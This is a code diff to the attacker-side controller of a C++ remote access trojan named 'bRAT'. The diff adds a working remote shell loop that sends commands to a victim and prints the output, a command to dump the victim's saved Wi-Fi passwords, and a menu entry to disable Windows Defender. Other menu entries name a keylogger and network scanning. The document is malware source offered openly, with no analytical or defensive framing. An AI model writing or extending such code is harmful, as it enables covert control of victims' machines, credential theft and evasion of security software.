@@ -1,11 +1,12 @@
 #include <stdio.h>
-#include "helpers.hpp"
+#include "includes/helpers.hpp"
 
 #ifdef _WIN32
 #include <WinSock2.h>
 #include <WS2tcpip.h>
 #pragma comment(lib, "ws2_32.lib")
 #define timeSleep 10000
+#define clear system("cls");
 #endif
 
 #ifdef __linux__
@@ -13,6 +14,7 @@
 #include <arpa/inet.h>
 #include <unistd.h>
 #define IPPROTO_TCP 0
+#define clear system("clear");
 #endif
 
 class Attacker {
@@ -36,7 +38,6 @@ class Attacker {
         #endif
             return false;
         }
-        std::cout << "Data " << buffer << " sent to " << ipAddr << " successfully!\n";
         return true;
     }
     std::string recvData(){
@@ -54,6 +55,7 @@ class Attacker {
         return newBuff;
     }
     int displayMenu(){
+        Helpers::divider();
         int uChoice;
         std::cout << "[x] Following features exist (so far) in bRAT:\n\n";
         std::cout << "1. Get a shell (Note: Some commands like cd, will not work.)\n";
@@ -65,15 +67,17 @@ class Attacker {
         std::cout << "7. Dump saved Wi-Fi passwords.\n";
         std::cout << "8. Enable keylogger (Beta)\n";
         std::cout << "9. Scan local network\n";
+        std::cout << "10. Disable Windows Defender\n";
         std::cout << "0. Exit\n\n";
         std::cout << "> Enter choice: ";
         std::cin >> uChoice;
-        while(uChoice < 0 || uChoice > 9){
+        while(uChoice < 0 || uChoice > 10){
             std::cin.clear();
             std::cin.ignore(INT_MAX, '\n');
             std::cout << "[!] Invalid Choice. Try again: ";
             std::cin >> uChoice;
         }
+        Helpers::divider();
         return uChoice;
     }
 public:
@@ -157,23 +161,41 @@ public:
             std::cout << "[!] Unable to receive data from server. Try re-establishing connection by restarting the RAT.\n";
             return;
         }
-        std::cout << "[=] Spawned Shell. To exit shell, type shellexit.\n[*] Note: If no output is returned, that means the command doesn't exist or an error has occurred. I didn't include the returning of stderr from the victim.\n\n";
+        std::string shellName = ps ? "PowerShell" : "Shell";
+        std::cout << "[=] Spawned  "<< shellName << ". To exit shell, type shellexit.\n[*] Note: If no output is returned, that means the command doesn't exist or an error has occurred. I didn't include the returning of stderr from the victim.\n\n";
         std::cout << "\n\n";
         std::string uInput;
+        int i = 0;
         do{
             std::cout << prompt;
-            std::cin.ignore();
+            if(!i++)
+                std::cin.ignore();
             std::getline(std::cin, uInput);
-            std::cout << uInput << std::endl;
+            while(uInput == ""){
+                std::cout << "Invalid input. Try again\n\n";
+                std::cout << prompt;
+                std::getline(std::cin, uInput);
+            }
+            sendData(uInput);
+            std::string output = recvData();
+            if(output != "exit")
+                std::cout << output;
         }while(uInput != "shellexit");
     }
     void dumpsysinfo(){}
+    void dumpWiFiPasswords(){
+        std::string cmd = "get-wifi-passwords";
+        sendData(cmd);
+        std::string recvd = recvData();
+        std::cout << recvd << std::endl;
+    }
     void getBanner(){
         if(clientSock == INVALID_SOCKET){
             std::cout << "[!] No connection established!\n";
             return;
         }
         std::cout << "[*] Fetching system info\n";
+        sendData(ipAddr);
         std::string banner = recvData();
         std::cout << banner;
 
@@ -188,7 +210,9 @@ public:
             switch(uChoice){
                 case 0:
                 std::cout << "You chose to exit!\n";
+                sendData("closeconn");
                 closesocket(clientSock);
+                break;
             // std::cout << "1. Get a shell (Note: Some commands like cd, will not work.)\n\n";
             // std::cout << "2. Get a powershell\n";
             // std::cout << "3. Dump system info\n";
@@ -198,9 +222,9 @@ public:
             // std::cout << "7. Dump saved Wi-Fi passwords.\n";
             // std::cout << "8. Enable keylogger (Beta)\n";
             // std::cout << "9. Scan local network\n";
+            // std::cout << "10. "Disable Windows Defender\n";
+            // std::cout << "11. Dump Clipboard\n";
             // std::cout << "0. Exit\n\n";
-                exit(0);
-                    break;
                 case 1:
                     invokeShell();
                     break;
@@ -216,7 +240,7 @@ public:
                     }
                     break;
                 case 3:
-                dumpsysinfo();
+                    dumpsysinfo();
                     break;
                 case 4:
                     break;
@@ -225,6 +249,7 @@ public:
                 case 6:
                     break;
                 case 7:
+                    dumpWiFiPasswords();
                     break;
                 case 8:
                     break;
@@ -261,23 +286,35 @@ int Attacker::hasBeenCreated = 0;
 void connect(std::string& ipAddr, int& port) {
     std::cout << "[*] Enter the IP Address you want to connect to: ";
     std::getline(std::cin, ipAddr);
+    if(ipAddr == "")
+        ipAddr = "127.0.0.1";
     std::cin.clear();
     std::cout << "[*] Enter the port number of the server you want to connect to: ";
     std::cin >> port;
+    while(port <= 0 || port > 65535){
+        std::cin.clear();
+        std::cin.ignore(INT_MAX, '\n');
+        std::cout << "[!] Invalid port number. Try again: ";
+        std::cin >> port;
+    }
 }
 
 
 int main() {
 
-    std::string ip = "192.168.0.101";
-    // std::string ip = "127.0.0.1";
-    int port = 6969;
-    //connect(ip, port);
-    Attacker* attacker = new Attacker(ip, port);
+    std::string ip;
+    int port;
+    // ip = "192.168.0.101";
+    ip = "127.0.0.1";
+    port = 6969;
 
     while (true) {
+        connect(ip, port);
+        std::cin.clear();
+        Attacker* attacker = new Attacker(ip, port);
         if(attacker->establishConnection())
             attacker->getBanner();
         Sleep(timeSleep);
+       clear
     }
 }
